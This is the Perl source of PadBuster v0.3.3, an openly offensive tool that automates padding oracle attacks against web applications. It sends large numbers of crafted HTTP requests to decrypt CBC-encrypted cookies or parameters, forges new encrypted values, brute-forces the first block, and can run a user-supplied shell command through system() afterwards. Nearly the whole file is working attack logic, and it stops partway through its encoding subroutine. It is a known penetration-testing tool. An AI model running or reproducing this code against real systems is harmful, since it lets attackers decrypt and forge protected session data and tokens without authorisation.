#!/usr/bin/perl
#
# PadBuster v0.3.3 - Automated script for performing Padding Oracle attacks
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
#
# Credits to J.Rizzo and T.Duong for providing proof of concept web exploit
# techniques and S.Vaudenay for initial discovery of the attack. Credits also
# to James M. Martin (research@esptl.com) for sharing proof of concept exploit
# code for performing various brute force attack techniques, and wireghoul (Eldar 
# Marcussen) for making code quality improvements. Credits for variuos
# improvements to GW (gw.2011@tnode.com or http://gw.tnode.com/) - Viris.
# 

use LWP::UserAgent;
use strict;
use warnings;
use Getopt::Std;
use MIME::Base64;
use URI::Escape;
use Getopt::Long;
use Time::HiRes qw( gettimeofday );
use Compress::Zlib;
use Crypt::SSLeay;
use File::Basename qw(dirname);
use File::Path qw(make_path);

# Set defaults with $variable = value
my $logging;
my $post;
my $encoding = 0;
my $headers;
my $cookie;
my $error;
my $prefix;
my $intermediaryInput;
my $cipherInput;
my $plainTextInput;
my $encodedPlainTextInput;
my $noEncodeOption;
my $superVerbose;
my $proxy;
my $proxyAuth;
my $cert;
my $noIv;
my $auth;
my $resumeBlock;
my $interactive = 0;
my $bruteForce;
my $randomize;
my $ignoreContent;
my $ignoreDistance;
my $useBody;
my $auto;
my $autoStore;
my $runAfter;
my $verbose;

GetOptions( "log:s" => \$logging,
            "post=s" => \$post,
            "encoding=s" => \$encoding,
            "headers=s" => \$headers,
            "cookies=s" => \$cookie,
            "error=s" => \$error,
            "prefix=s" => \$prefix,
            "intermediate=s" => \$intermediaryInput,
            "ciphertext=s" => \$cipherInput,
            "plaintext=s" => \$plainTextInput,
            "encodedtext=s" => \$encodedPlainTextInput,
            "noencode" => \$noEncodeOption,
            "veryverbose" => \$superVerbose,
            "proxy=s" => \$proxy,
            "proxyauth=s" => \$proxyAuth,
            "cert=s" => \$cert,
            "noiv" => \$noIv,
            "auth=s" => \$auth,
            "resume=s" => \$resumeBlock,
            "interactive" => \$interactive,
            "bruteforce" => \$bruteForce,
            "randomize" => \$randomize,
            "ignorecontent" => \$ignoreContent,
            "ignoredistance=s" => \$ignoreDistance,
            "usebody" => \$useBody,
            "auto=s" => \$auto,
            "autostore=s" => \$autoStore,
            "runafter=s" => \$runAfter,
            "verbose" => \$verbose);
  
print "\n+-------------------------------------------+\n";
print "| PadBuster - v0.3.3                        |\n";
print "| Brian Holyfield - Gotham Digital Science  |\n";
print "| labs\@gdssecurity.com                      |\n";
print "+-------------------------------------------+\n";

if ($#ARGV < 2) { 
 die "    
    Use: padBuster.pl URL EncryptedSample BlockSize [options]

  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to test. Must
                           also be present in the URL, PostData or a Cookie
         BlockSize = The block size being used by the algorithm

Options:
	 -auth [username:password]: HTTP Basic Authentication 
	 -bruteforce: Perform brute force against the first block 
	 -ciphertext [Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)
         -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
         -encoding [0-4]: Encoding Format of Sample (Default 0)
                          0=Base64, 1=Lower HEX, 2=Upper HEX
                          3=.NET UrlToken, 4=WebSafe Base64
         -encodedtext [Encoded String]: Data to Encrypt (Encoded)
         -error [Error String]: Padding Error Message
         -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
	 -interactive: Prompt for confirmation on decrypted bytes
	 -intermediate [Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)
	 -log [customdir]: Generate log files (creates PadBuster.DDMMYY or customdir)
	 -noencode: Do not URL-encode the payload (encoded by default)
	 -noiv: Sample does not include IV (decrypt first block) 
         -plaintext [String]: Plain-Text to Encrypt
         -post [Post Data]: HTTP Post Data String
	 -prefix [Prefix]: Prefix bytes to append to each sample (Encoded) 
	 -proxy [address:port]: Use HTTP/S Proxy
	 -proxyauth [username:password]: Proxy Authentication
	 -cert [pkcs12:file:pass or pem:crt:key]: HTTPS client certificate
	 -resume [Block Number]: Resume at this block number
	 -randomize: Randomize brute force attempts (similar to Web.config bruter)
	 -ignoredistance [Levenshtein distance]: Ignore responses with smaller distance
	 -usebody: Use response body content for response analysis phase
	 -auto [maxrequests]: Automatic decision making and stopping after maxrequests
	 -autostore [fileprefix]: Automatic storing to files (replaces #ATT, #STAT, #SUM)
	 -runafter [cmd]: Command to run after finished encryption (replaces #ENC, #DIR)
         -verbose: Be Verbose
         -veryverbose: Be Very Verbose (Debug Only)
         
";}

# Ok, if we've made it this far we are ready to begin..
my $url = $ARGV[0];
my $sample = $ARGV[1];
my $blockSize = $ARGV[2];

if ($url eq "" || $sample eq "" || $blockSize eq "") {
	print "\nERROR: The URL, EncryptedSample and BlockSize cannot be null.\n";
	exit();
}

# Hard Coded Inputs
#$post = "";
#$sample = "";

my $lwp;
my $method = $post ? "POST" : "GET";

# These are file related variables
my $dirName = ($logging) ? $logging : ("PadBuster." . &getTime("F"));
my $dirSlash = (defined($ENV{'OS'}) && $ENV{'OS'} =~ /Windows/) ? "\\" : "/";
my $printStats = 0;
my $requestTracker = 0;
my $timeTracker = 0;
 
if ($encoding < 0 || $encoding > 4) {
	print "\nERROR: Encoding must be a value between 0 and 4\n";
	exit();
} 
my $encodingFormat = $encoding ? $encoding : 0;

my $encryptedBytes = $sample;
my $totalRequests = 0;
my $reqsPerSession = 1000;
my $retryWait = 10;
my $retryRepeat = 10;
my $repeatAutoAnalysis = 5;

if ($cert) {
	my ($certType, $certFile, $certPass) = split(/:/,$cert);
	if (lc($certType) eq 'pkcs12') {
		$ENV{HTTPS_PKCS12_FILE}     = $certFile;
		if (!$certPass && !$ENV{HTTPS_PKCS12_PASSWORD}) {
			$certPass = &promptUser("Enter $certType certificate '$certFile' password", "", 2);
		}
		if ($certPass) {
			$ENV{HTTPS_PKCS12_PASSWORD} = $certPass;
		}
	} elsif (lc($certType) eq 'pem') {
		$ENV{HTTPS_CERT_FILE} = $certFile;
		$ENV{HTTPS_KEY_FILE}  = $certPass;
	} else {
		print "\nERROR: Invalid certificate type!";
		exit();
	}
}

# See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)
if ($sample =~ /\%/) {
	$encryptedBytes = &uri_unescape($encryptedBytes)
}

# Prep the sample for regex use
$sample = quotemeta $sample;

# Now decode
$encryptedBytes = &myDecode($encryptedBytes, $encodingFormat);
if ( (length($encryptedBytes) % $blockSize) > 0) {
	print "\nERROR: Encrypted Bytes must be evenly divisible by Block Size ($blockSize)\n";
	print "       Encrypted sample length is ".int(length($encryptedBytes)).". Double check the Encoding and Block Size.\n";
	exit();
}

# If no IV, then append nulls as the IV (only if decrypting)
if ($noIv && !$bruteForce && !$plainTextInput) {
	$encryptedBytes = "\x00" x $blockSize . $encryptedBytes;
}

# PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)
my $plainTextBytes;

# This is a bool to make sure we know where to replace the sample string
my $wasSampleFound = 0;

# ForgedBytes is where the complete forged sample will be stored (encrypt only)
my $forgedBytes;

# Isolate the IV into a separate byte array
my $ivBytes = substr($encryptedBytes, 0, $blockSize);

# Declare some optional elements for storing the results of the first test iteration
# to help the user if they don't know what the padding error looks like
my %oracleGuesses;
my %oracleCandidates;
my @oracleSignatures = ();
my %responseFileBuffer;

# The block count should be the sample divided by the blocksize
my $blockCount = int(length($encryptedBytes)) / int($blockSize);

if (!$bruteForce && !$plainTextInput && $blockCount < 2) {
	print "\nERROR: There is only one block. Try again using the -noiv option.\n";
	exit();
}

# The attack works by sending in a real cipher text block along with a fake block in front of it
# You only ever need to send two blocks at a time (one real one fake) and just work through
# the sample one block at a time


# First, re-issue the original request to let the user know if something is potentially broken
my ($status, $content, $location, $contentLength) = &makeRequest($method, $url, $post, $cookie);

&myPrint("\nINFO: The original request returned the following",0);
&myPrint("[+] Status: $status",0);	
&myPrint("[+] Location: $location",0);
&myPrint("[+] Content Length: $contentLength\n",0);
&myPrint("[+] Response: $content\n",1);

$plainTextInput = &myDecode($encodedPlainTextInput,$encodingFormat) if $encodedPlainTextInput;

if ($bruteForce) {
	&myPrint("INFO: Starting PadBuster Brute Force Mode",0);
	my $bfAttempts = 0;
	
	print "INFO: Resuming previous brute force at attempt $resumeBlock\n" if $resumeBlock;
	
	# Only loop through the first 3 bytes...this should be enough as it 
	# requires 16.5M+ requests
	
	my @bfSamples;
	my $sampleString = "\x00" x 2;
	for my $c (0 ... 255) {
	 substr($sampleString, 0, 1, chr($c));
	 for my $d (0 ... 255) {
	  substr($sampleString, 1, 1, chr($d));
	  push (@bfSamples, $sampleString);
	 }
	}

	foreach my $testVal (@bfSamples) {
	 my $complete = 0;
	 while ($complete == 0) {
	  my $repeat = 0;
	  for my $b (0 ... 255) {
  	   $bfAttempts++;
	   if($auto && $bfAttempts > $auto) {
		   myPrint("\nStopping after reaching maximal number of requests ($bfAttempts)\n",0);
		   goto ENDBFLOOP;
	   }
  	   if ( $resumeBlock && ($bfAttempts < ($resumeBlock - ($resumeBlock % 256)+1)) ) {
		   #SKIP
	   } else {
		   my $testBytes;
		   if($#oracleSignatures >= 0 && $randomize || $#oracleSignatures < 0 && $printStats > 0) {
				$testBytes = '';
				for (1 .. $blockSize) {
					$testBytes .= chr(int(rand(256)));
				}
			} else {
				$testBytes = chr($b).$testVal;
				$testBytes .= "\x00" x ($blockSize-3);
			}

		   my $combinedBf = $testBytes . $encryptedBytes;
		   $combinedBf = &myEncode($combinedBf, $encodingFormat);

		   # Add the Query String to the URL
		   my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedBf);  	  
		   

		   # Issue the request
		   my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);

		   my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";

		   if ($#oracleSignatures < 0) {
			&myPrint("[+] Starting response analysis...\n",0) if ($b ==0);
			$oracleGuesses{$signatureData}++;
			$oracleCandidates{$signatureData} = $content;
			$responseFileBuffer{$signatureData} = "Status: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
			if ($b == 255) {
				if (!$auto || $printStats >= $repeatAutoAnalysis) {
					&myPrint("*** Response Analysis Complete ***\n",0);
					&determineSignature();
				}
				$printStats++;
				$timeTracker = 0;
				$requestTracker = 0;
				$repeat = 1;
				$bfAttempts = 0;
			}
		   }
		   if ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures) {
			my $contentRealLength = length($content);
			my $distance = &levenshtein($content, $oracleCandidates{$oracleSignatures[0]});
			my $strAttempt;
			if ($status >= 300 || $status < 400) {
				$strAttempt = "Attempt $bfAttempts - Status: $status - Content Length: $contentLength ($contentRealLength) - Distance: $distance - Location: $location\n$testUrl\n";
			} else {
				$strAttempt = "Attempt $bfAttempts - Status: $status - Content Length: $contentLength ($contentRealLength) - Distance: $distance\n$testUrl\n";
			}
			if (!$ignoreDistance || $distance > $ignoreDistance) {
				&myPrint($strAttempt,0);
				&writeFile("Summary.txt", "# $strAttempt");
				if ($autoStore) {
					my $filename = "$autoStore";
					my $chksum = unpack( '%32A*', $content );
					if (!(($filename =~ s/#ATT/$bfAttempts/g) | ($filename =~ s/#STAT/$status/g) | ($filename =~ s/#SUM/$chksum/g))) {
						goto ENDBFLOOP;  # Finish after storing to a static filename
					}
					make_path(dirname($filename));
					open(OUTFILE, ">$filename") or die "ERROR: Can't write to file $filename\n";
					print OUTFILE $content;
					close(OUTFILE);
				}
			}
			&writeFile("Brute_Force_Attempt_".$bfAttempts.".txt", "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength ($contentRealLength)\nDistance: $distance\nContent:\n$content");
		   }
	   }
	  }
	  ($repeat == 1) ? ($complete = 0) : ($complete = 1);
	 } 
	}
ENDBFLOOP:
} elsif ($plainTextInput) {
	# ENCRYPT MODE
	&myPrint("INFO: Starting PadBuster Encrypt Mode",0);
	
	# The block count will be the plaintext divided by blocksize (rounded up)	
	my $blockCount = int(((length($plainTextInput)+1)/$blockSize)+0.99);
	&myPrint("[+] Number of Blocks: ".$blockCount."\n",0);
	
	my $padCount = ($blockSize * $blockCount) - length($plainTextInput);	
	$plainTextInput.= chr($padCount) x $padCount;
	
	# SampleBytes is the encrypted text you want to derive intermediate values for, so 
	# copy the current ciphertext block into sampleBytes
	# Note, nulls are used if not provided and the intermediate values are brute forced
	
	$forgedBytes = $cipherInput ? &myDecode($cipherInput,1) : "\x00" x $blockSize;
	my $sampleBytes = $forgedBytes;
	
	for (my $blockNum = $blockCount; $blockNum > 0; $blockNum--) {
		# IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored
		my $intermediaryBytes;
		
		if ($intermediaryInput && $blockNum == $blockCount) {
			$intermediaryBytes = &myDecode($intermediaryInput,2);
		} else {
			$intermediaryBytes = &processBlock($sampleBytes);
		}
				
	        # Now XOR the intermediate bytes with the corresponding bytes from the plain-text block
	        # This will become the next ciphertext block (or IV if the last one)
	        $sampleBytes = $intermediaryBytes ^ substr($plainTextInput, (($blockNum-1) * $blockSize), $blockSize);
		$forgedBytes = $sampleBytes.$forgedBytes;
		
		&myPrint("\nBlock ".($blockNum)." Results:",0);
		&myPrint("[+] New Cipher Text (HEX): ".&myEncode($sampleBytes,1),0);
		&myPrint("[+] Intermediate Bytes (HEX): ".&myEncode($intermediaryBytes,1)."\n",0);
		
	}
	$forgedBytes = &myEncode($forgedBytes, $encoding);
	chomp($forgedBytes);
} else {
	# DECRYPT MODE
	&myPrint("INFO: Starting PadBuster Decrypt Mode",0);
	
	if ($resumeBlock) {
		&myPrint("INFO: Resuming previous exploit at Block $resumeBlock\n",0);
	} else {
		$resumeBlock = 1
	}
	
	# Assume that the IV is included in our sample and that the first block is the IV	
	for (my $blockNum = ($resumeBlock+1); $blockNum <= $blockCount; $blockNum++) {
		# Since the IV is the first block, our block count is artificially inflated by one
		&myPrint("*** Starting Block ".($blockNum-1)." of ".($blockCount-1)." ***\n",0);
		
		# SampleBytes is the encrypted text you want to break, so 
		# lets copy the current ciphertext block into sampleBytes
		my $sampleBytes = substr($encryptedBytes, ($blockNum * $blockSize - $blockSize), $blockSize);

		# IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored
		my $intermediaryBytes = &processBlock($sampleBytes);

		# DecryptedBytes is where the decrypted block is stored
		my $decryptedBytes;			        	

		# Now we XOR the decrypted byte with the corresponding byte from the previous block
		# (or IV if we are in the first block) to get the actual plain-text
		$blockNum == 2 ? $decryptedBytes = $intermediaryBytes ^ $ivBytes : $decryptedBytes = $intermediaryBytes ^ substr($encryptedBytes, (($blockNum - 2) * $blockSize), $blockSize);

		&myPrint("\nBlock ".($blockNum-1)." Results:",0);
		&myPrint("[+] Cipher Text (HEX): ".&myEncode($sampleBytes,1),0);
		&myPrint("[+] Intermediate Bytes (HEX): ".&myEncode($intermediaryBytes,1),0);
		&myPrint("[+] Plain Text: $decryptedBytes\n",0);
		$plainTextBytes = $plainTextBytes.$decryptedBytes;
	}
}

&myPrint("-------------------------------------------------------",0);	
&myPrint("** Finished ***\n", 0);
if ($plainTextInput) {
	if (! $noEncodeOption) {
		$forgedBytes = &uri_escape($forgedBytes);
	}
	&myPrint("[+] Encrypted value is: $forgedBytes\n",0);

	if($runAfter) {
		&myPrint("-------------------------------------------------------\n",0);	
		$runAfter =~ s/#ENC/$forgedBytes/g;
		$runAfter =~ s/#DIR/$dirName/g;
		if (open(FILE, "<", "/proc/$$/cmdline")) {
			my $cmdline = <FILE>;
			$cmdline =~ s/\x00/ '/;
			$cmdline =~ s/\x00/' '/g;
			$cmdline =~ s/ '$//;
			close(FILE);
			&myPrint("Pri: $cmdline",0);
			&writeFile("Summary.txt", "\n$cmdline\n");
		}
		&myPrint("Run: $runAfter",0);
		&writeFile("Summary.txt", "$runAfter\n\n");
		&myPrint("-------------------------------------------------------\n",0);	
		my $ret = system($runAfter);
		&myPrint("-------------------------------------------------------\n",0);	
		&myPrint("Exit $ret from: $runAfter",0);
	}
} elsif (defined($plainTextBytes)) {	
	&myPrint("[+] Decrypted value (ASCII): $plainTextBytes\n",0);
	&myPrint("[+] Decrypted value (HEX): ".&myEncode($plainTextBytes,2)."\n", 0);
	&myPrint("[+] Decrypted value (Base64): ".&myEncode($plainTextBytes,0)."\n", 0);
}
&myPrint("-------------------------------------------------------\n",0);	

sub determineSignature { 
	# Help the user detect the oracle response if an error string was not provided
	# This logic will automatically suggest the response pattern that occured most often 
	# during the test as this is the most likeley one

	my @sortedGuesses = sort {$oracleGuesses{$a} <=> $oracleGuesses{$b}} keys %oracleGuesses; 

	&myPrint("The following response signatures were returned:\n",0);
	&myPrint("-------------------------------------------------------",0);
	if ($useBody) {
		&myPrint("ID#\tFreq\tStatus\tLength\tChksum\tLocation",0);
	} else {
		&myPrint("ID#\tFreq\tStatus\tLength\tLocation",0);
	}
	&myPrint("-------------------------------------------------------",0);

	my $id = 1;

	foreach (@sortedGuesses) {
		my $line = $id;
		($id == $#sortedGuesses+1 && $#sortedGuesses != 0) ? $line.=" **" : $line.="";
		my @sigFields = split("\t", $_);
		$line .= "\t$oracleGuesses{$_}\t$sigFields[0]\t$sigFields[1]";
		$useBody ? ( $line .= "\t".unpack( '%32A*', $sigFields[3] ) ) : $line.="";
		$line .= "\t$sigFields[2]";
		&myPrint($line,0);
		&writeFile("Response_Analysis_Signature_".$id.".txt", $responseFileBuffer{$_});
		$id++;
	}
	&myPrint("-------------------------------------------------------",0);	

	if ($#sortedGuesses == 0 && !$bruteForce) {
		&myPrint("\nERROR: All of the responses were identical.\n",0);
		&myPrint("Double check the Block Size and try again.",0);
		exit();
	} else {
		my @oracleNums;
		if ($auto) {
			if ($bruteForce) {
			    @oracleNums =1..($#sortedGuesses+1);  # Auto select all
			} else {
			    @oracleNums =($#sortedGuesses+1);  # Auto select recommended
			}
		} else {
		    @oracleNums =split(/[,\s]+/, &promptUser("\nEnter a comma separated list of IDs that match the error condition\nNOTE: The ID# marked with ** is recommended",''));
		}
		for (@oracleNums) {
			push(@oracleSignatures, $sortedGuesses[$_-1]);
		}
		if($#oracleSignatures >= 0) {
			&myPrint("\nContinuing test with selection [@oracleNums]\n",0);
		}
	}
}

sub prepRequest {
	my ($pUrl, $pPost, $pCookie, $pSample, $pTestBytes) = @_;

	# Prepare the request			
	my $testUrl = $pUrl;
	my $wasSampleFound = 0;
	
	if ($pUrl =~ /$pSample/) {
		$testUrl =~ s/$pSample/$pTestBytes/;
		$wasSampleFound = 1;
	} 

	my $testPost = "";
	if ($pPost) {
		$testPost = $pPost;
		if ($pPost =~ /$pSample/) {
			$testPost =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	my $testCookies = "";
	if ($pCookie) {
		$testCookies = $pCookie;
		if ($pCookie =~ /$pSample/) {
			$testCookies =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	if ($wasSampleFound == 0) {
		&myPrint("ERROR: Encrypted sample was not found in the test request",0);
		exit();
	}
	return ($testUrl, $testPost, $testCookies);
}

sub processBlock {
  	my ($sampleBytes) = @_; 
  	
  	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
  	my $analysisMode = (!$error && $#oracleSignatures < 0) ? 0 : 1;
  	
  	# The return value of this subroutine is the intermediate text for the block
	my $returnValue;
  	
  	my $complete = 0;
  	my $autoRetry = 0;
  	my $hasHit = 0;
  	
  	while ($complete == 0) {
  		# Reset the return value
  		$returnValue = "";
  		
  		my $repeat = 0;
	
		# TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack
		my $testBytes = "\x00" x $blockSize;
	
		my $falsePositiveDetector = 0;

		# Work on one byte at a time, starting with the last byte and moving backwards
		OUTERLOOP:
		for (my $byteNum = $blockSize - 1; $byteNum >= 0; $byteNum--) {
			INNERLOOP:
			for (my $i = 255; $i >= 0; $i--) {
				# Fuzz the test byte
				substr($testBytes, $byteNum, 1, chr($i));

				# Combine the test bytes and the sample
				my $combinedTestBytes = $testBytes.$sampleBytes;

				if ($prefix) {
					$combinedTestBytes = &myDecode($prefix,$encodingFormat).$combinedTestBytes 
				}

				$combinedTestBytes = &myEncode($combinedTestBytes, $encodingFormat);
				chomp($combinedTestBytes);

				if (! $noEncodeOption) {
					$combinedTestBytes = &uri_escape($combinedTestBytes); 
				}

				my ($testUrl, $testPost, $testCookies) = &prepRequest($url, $post, $cookie, $sample, $combinedTestBytes);

				# Ok, now make the request

				my ($status, $content, $location, $contentLength) = &makeRequest($method, $testUrl, $testPost, $testCookies);

				
				my $signatureData = ($useBody) ? "$status\t$contentLength\t$location\t$content" : "$status\t$contentLength\t$location";
				
				# If this is the first block and there is no padding error message defined, then cycle through 
				# all possible requests and let the user decide what the padding error behavior is.
				if ($analysisMode == 0) {
					&myPrint("INFO: No error string was provided...starting response analysis\n",0) if ($i == 255);
					$oracleGuesses{$signatureData}++;
					
					$responseFileBuffer{$signatureData} = "URL: $testUrl\nPost Data: $testPost\nCookies: $testCookies\n\nStatus: $status\nLocation: $location\nContent-Length: $contentLength\nContent:\n$content";
					
					if ($byteNum == $blockSize - 1 && $i == 0) {
						&myPrint("*** Response Analysis Complete ***\n",0);
						&determineSignature();
						$analysisMode = 1;
						$repeat = 1;
						last OUTERLOOP;
					}
				}

				my $continue = "y";

				if (($error && $content !~ /$error/) || ($#oracleSignatures >= 0 && !grep {$signatureData eq $_} @oracleSignatures)) {
					# This is for autoretry logic (only works on the first byte)
					if ($autoRetry > 0 &&  ($byteNum == ($blockSize - 1) ) && $hasHit == 0 ) {
						$hasHit++;
					} else {
						# If there was no padding error, then it worked
						&myPrint("[+] Success: (".abs($i-256)."/256) [Byte ".($byteNum+1)."]",0);
						&myPrint("[+] Test Byte:".&uri_escape(substr($testBytes, $byteNum, 1)),1);
						
						# If continually getting a hit on attempt zero, then something is probably wrong
						$falsePositiveDetector++ if ($i == 255);

						if ($interactive == 1) {
							$continue = &promptUser("Do you want to use this value (Yes/No/All)? [y/n/a]","",1);
						}

						if ($continue eq "y" || $continue eq "a") {
							$interactive = 0 if ($continue eq "a");

							# Next, calculate the decrypted byte by XORing it with the padding value
							my ($currentPaddingByte, $nextPaddingByte);

							# These variables could allow for flexible padding schemes (for now PCKS)
							# For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)
							$currentPaddingByte = chr($blockSize - $byteNum);
							$nextPaddingByte = chr($blockSize - $byteNum + 1);

							my $decryptedByte = substr($testBytes, $byteNum, 1) ^ $currentPaddingByte;
							&myPrint("[+] XORing with Padding Char, which is ".&uri_escape($currentPaddingByte),1);

							$returnValue = $decryptedByte.$returnValue;
							&myPrint("[+] Decrypted Byte is: ".&uri_escape($decryptedByte),1);

							# Finally, update the test bytes in preparation for the next round, based on the padding used 
							for (my $k = $byteNum; $k < $blockSize; $k++) {
								# First, XOR the current test byte with the padding value for this round to recover the decrypted byte
								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $currentPaddingByte));				

								# Then, XOR it again with the padding byte for the next round
								substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $nextPaddingByte));
							}
							last INNERLOOP;                        
						}

					}
				}
				
				## TODO: Combine these two blocks?
				if ($i == 0 && $analysisMode == 1) {
					# End of the road with no success.  We should probably try again.
					&myPrint("ERROR: No matching response on [Byte ".($byteNum+1)."]",0);

					if ($autoRetry < $retryRepeat) {
						&myPrint("       Automatically trying ".($retryRepeat-$autoRetry)." more times...",0);
  						sleep $retryWait;
						$autoRetry++;
						$repeat = 1;
						last OUTERLOOP;
						
					} else {
						if (($byteNum == $blockSize - 1) && ($error)) {
							&myPrint("\nAre you sure you specified the correct error string?",0);
							&myPrint("Try re-running without the -e option to perform a response analysis.\n",0);
						} 

						$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
						if ($continue ne "n") {
							if ($continue ne "a") {
								&myPrint("INFO: Switching to interactive mode",0);
								$interactive = 1;
							}
							$repeat = 1;
							last OUTERLOOP;
						}
					}
				}   
				if ($falsePositiveDetector == $blockSize) {
					&myPrint("\n*** ERROR: It appears there are false positive results. ***\n",0);
					&myPrint("HINT: The most likely cause for this is an incorrect error string.\n",0);
					if ($error) {
						&myPrint("[+] Check the error string you provided and try again, or consider running",0);
						&myPrint("[+] without an error string to perform an automated response analysis.\n",0);
					} else {
						&myPrint("[+] You may want to consider defining a custom padding error string",0);
						&myPrint("[+] instead of the automated response analysis.\n",0);
					}
					$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
					if ($continue ne "n") {
						if ($continue ne "a") {
							&myPrint("INFO: Switching to interactive mode",0);
							$interactive = 1;
						}
						$repeat = 1;
						last OUTERLOOP;
					}
				}
			} 
		}
		($repeat == 1) ? ($complete = 0) : ($complete = 1);
	}
	return $returnValue;
}

sub makeRequest {
 
 my ($method, $url, $data, $cookie) = @_; 
 my ($noConnect, $status, $content, $req, $location, $contentLength);   
 my $numRetries = 0;
 $data ='' unless $data;
 $cookie='' unless $cookie;

 $requestTracker++;
 do {
  #Quick hack to avoid hostname in URL when using a proxy with SSL (this will get re-set later if needed)
  $ENV{HTTPS_PROXY} = "";
  
  if(!$lwp || ($totalRequests % $reqsPerSession) == 0) {
    sleep $retryWait;
    $lwp = LWP::UserAgent->new(env_proxy => 1, keep_alive => 1, timeout => 60, requests_redirectable => []);

    if ($proxy) {
  	  my $proxyUrl = "http://";
  	  if ($proxyAuth) {
 		my ($proxyUser, $proxyPass) = split(":",$proxyAuth);
 		$ENV{HTTPS_PROXY_USERNAME} = $proxyUser;
		$ENV{HTTPS_PROXY_PASSWORD} = $proxyPass;
		$proxyUrl .= $proxyAuth."@";
 	  }
 	  $proxyUrl .= $proxy;
 	  $lwp->proxy(['http'], "http://".$proxy);
	  $ENV{HTTPS_PROXY} = "http://".$proxy;
    }
  }
 
  $req = new HTTP::Request $method => $url;

  &myPrint("Request:\n$method\n$url\n$data\n$cookie",0) if $superVerbose;
  
  # Add request content for POST and PUTS 
  if ($data) {
   $req->content_type('application/x-www-form-urlencoded');
   $req->content($data);
  }


  if ($auth) {
   my ($httpuser, $httppass) = split(/:/,$auth);
   $req->authorization_basic($httpuser, $httppass);
  }

  # If cookies are defined, add a COOKIE header
  if (! $cookie eq "") {
   $req->header(Cookie => $cookie);
  }
 
  if ($headers) {
   my @customHeaders = split(/;/i,$headers);
   for (my $i = 0; $i <= $#customHeaders; $i++) {
    my ($headerName, $headerVal) = split(/\::/i,$customHeaders[$i]);
    $req->header($headerName, $headerVal);
   }
  }
 
  my $startTime = &gettimeofday();
  my $response = $lwp->request($req);
  my $endTime = &gettimeofday();  
  $timeTracker = $timeTracker + ($endTime - $startTime);
  
  if ($printStats == 1 && $requestTracker % 500 == 0) {
  	print "[+] $requestTracker Requests Issued (Avg Request Time: ".(sprintf "%.3f", $timeTracker/100).")\n";
  	$timeTracker = 0;
  }
  
  
  # Extract the required attributes from the response
  $status = substr($response->status_line, 0, 3);
  $content = $response->content;
 
  $location = $response->header("Location");
  $contentLength = $response->header("Content-Length");
  #$contentLength = length($content);
  
  
  my $contentEncoding = $response->header("Content-Encoding");
  if ($contentEncoding) {
    if ($contentEncoding =~ /GZIP/i ) {
      $content = Compress::Zlib::memGunzip($content);
      $contentLength = length($content);
    }
  }
  &myPrint("Response Content:\n$content",0) if $superVerbose;
  
  my $statusMsg = $response->status_line;
  #myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); 
 
  #eg: Status: 500 Can't connect to example.com:81 (connect: Connection timed out), Location: N/A, Length:
  #eg: Status: 500 Server closed connection without sending any data back, Location: N/A, Length:
  if (!defined($location) && !defined($contentLength) && $status eq '500') {
   print "ERROR: $statusMsg\n   Retrying in $retryWait seconds...\n\n";
   $noConnect = 1;
   $numRetries++;
   $lwp = undef;
   sleep $retryWait;
  } else {
   $noConnect = 0;
   $totalRequests++;
  }  
 } until (($noConnect == 0) || ($numRetries >= $retryRepeat));
 if ($numRetries >= $retryRepeat) {
  &myPrint("ERROR: Number of retries has exceeded $retryRepeat attempts...quitting.\n",0);
  exit;
 }
 if (!$location) {
   $location = "N/A";
 }
 return ($status, $content, $location, $contentLength);
}
 
sub myPrint {
 my ($printData, $printLevel) = @_;
 $printData .= "\n";
 if (($verbose && $printLevel > 0) || $printLevel < 1 || $superVerbose) {
  print $printData;
  &writeFile("ActivityLog.txt",$printData);
 }
}

sub myEncode {
 my ($toEncode, $format) = @_;
 return &encodeDecode($toEncode, 0, $format);
}

sub myDecode {
 my ($toDecode, $format) = @_;
 return &encodeDecode($toDecode, 1, $format);
}

sub encodeDecode {
 my ($toEncodeDecode, $oper, $format) = @_;
 # Oper: 0=Encode, 1=Decode
 # Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken
 my $returnVal = "";
 if ($format == 1 || $format == 2) {
   # HEX
   if ($oper == 1) {
   	#Decode
   	#Always convert to lower when decoding)
   	$toEncodeDecode = lc($toEncodeDecode);
	$returnVal = pack("H*",$toEncodeDecode);
   } else {
   	#Encode
	$returnVal = unpack("H*",$toEncodeDecode);
	if ($format == 2) {
	   	#Uppercase
		$returnVal = uc($returnVal)
   	}
   }
 } elsif ($format == 3) {
   # NetUrlToken
   if ($oper == 1) {
	$returnVal = &web64Decode($toEncodeDecode,1);
   } else {
	$returnVal = &web64Encode($toEncodeDecode,1);
   } 
 } elsif ($format == 4) {
    # Web64
    if ($oper == 1) {
 	$returnVal = &web64Decode($toEncodeDecode,0);
    } else {
    $returnVal = &web64Encode($toEncodeDecode,0);
    } 
 } else {
    # B64
    if ($oper == 1) {
 	$returnVal = &decode_base64($toEncodeDecode);
    } else {
 	$returnVal = &encode_base64($toEncodeDecode);
